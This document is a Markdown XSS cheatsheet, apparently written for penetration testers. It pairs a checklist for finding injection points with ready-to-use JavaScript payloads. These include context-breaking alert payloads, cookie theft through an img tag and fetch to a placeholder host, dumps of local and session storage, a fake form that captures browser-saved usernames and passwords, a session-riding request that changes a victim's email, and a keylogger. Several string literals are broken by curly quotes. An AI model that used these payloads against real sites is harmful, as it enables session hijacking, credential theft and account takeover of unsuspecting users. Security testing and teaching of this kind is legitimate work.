---
tags:
  - xss
  - cheatsheet
---
# XSS Cheatsheet

## Checklist

- [ ] Enter unique string in every input field - check where it's being reflected in the DOM
- [ ] Check input in GET and POST requests
- [ ] Be sure to check the context in which it's reflected
	- input
	- textarea
	- JS
	- HTML attribute
	- title
	- style
	- etc.
- [ ] It may be reflected somewhere that isn't visible on the screen
- [ ] Try to escape the context where input is reflected
	- Example:
		`?color=%23FFFFFe;}</style><script>alert(1)</script>`
	- Injecting into JavaScript context example: `;alert(1);//`
	- If this doesn't work, try adding another attribute to the tag where input is reflected.
- [ ] Check for filter evasion
	- Case sensitivity
	- Filtered non-recursively
	- Try different encodings
	- Try leaving off closing bracket
- [ ] Check content-type

	!!! tip "Check for APIs"
		This is particularly important for API endpoints
	
	- If the content type doesn't match what is actually returned (e.g., text/html with JSON returned from an API), try accessing the endpoint directly and see if HTML injection is possible. 

- [ ] Check for XSS in any markdown input fields
	- Links are good for this
	- Try different encodings, casing, etc.
	- Try smuggling special characters in...adding new attributes, etc.
- [ ] Look for areas where input is being stored and served to all users
- [ ] Check for blind XSS
	- Something that fires on a backend application
		- Customer service page
		- Shipping page
		- Admin dashboard
	- What are backend users likely to see? 
		- Service ticket
		- Reporting a post or user
		- etc.


## Building Requests

```js title="XMLHTTP Request"
let xhr = new XMLHttpRequest()
xhr.open('GET','http://localhost/endpoint',true)
xhr.send('email=update@email.com’)
```

```js title="Fetch API"
fetch('http://localhost/endpoint’)
```

## Stealing Cookies

```js title="Using img src"
<img src="http://localhost?c='+document.cookie+'" />
```

```js title="Using the Fetch API"
fetch("http://localhost?c=" + document.cookie);
```

## Accessing Local & Session Storage

```js title="Local storage"
let localStorageData = JSON.stringify(localStorage);
```

```js title="Session storage"
let sessionStorageData = JSON.stringify(sessionStorage);
```

## Saved Credentials

```js title="Saved creds"
// create the input elements

let usernameField = document.createElement("input");
usernameField.type = "text";
usernameField.name = "username";
usernameField.id = "username";
let passwordField = document.createElement("input");
passwordField.type = "password";
passwordField.name = "password";
passwordField.id = "password";

// append the elements to the body of the page
document.body.appendChild(usernameField);
document.body.appendChild(passwordField);

// exfiltrate as needed (we need to wait for the fields to be filled before exfiltrating the information)
setTimeout(function () {
  console.log("Username:", document.getElementById("username").value);
  console.log("Password:", document.getElementById("password").value);
}, 1000);
```

## Session Riding

```js title="Session riding"
let xhr = new XMLHttpRequest();
xhr.open('POST','http://localhost/updateprofile',true);
xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
xhr.send('email=updated@email.com’);
```

## Keylogging

```js title="JS Keylogger"
document.onkeypress = function (e) {
  get = window.event ? event : e;
  key = get.keyCode ? get.keyCode : get.charCode;
  key = String.fromCharCode(key);
  console.log(key);
};
```
